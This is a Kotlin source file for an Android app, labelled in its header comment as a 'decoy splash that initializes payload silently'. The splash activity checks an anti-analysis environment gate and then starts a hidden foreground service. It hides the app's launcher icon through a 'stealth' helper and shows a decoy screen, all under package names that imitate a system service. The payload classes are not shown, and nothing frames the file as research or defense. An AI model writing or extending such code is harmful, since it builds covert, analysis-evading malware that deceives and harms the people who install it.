// [context: Kotlin, Android API 26+, decoy splash that initializes payload silently]
package com.system.service.ui

import android.app.Activity
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import com.system.service.anti.EnvironmentKey
import com.system.service.core.CoreService

class SplashActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!EnvironmentKey.shouldActivate()) {
            finish(); return
        }
        val svc = Intent(this, CoreService::class.java)
        startForegroundService(svc)
        com.system.service.stealth.IconHider.hideIcon(this)
        Handler(Looper.getMainLooper()).postDelayed({
            startActivity(Intent(this, DecoyActivity::class.java))
            finish()
        }, 1500)
    }
}
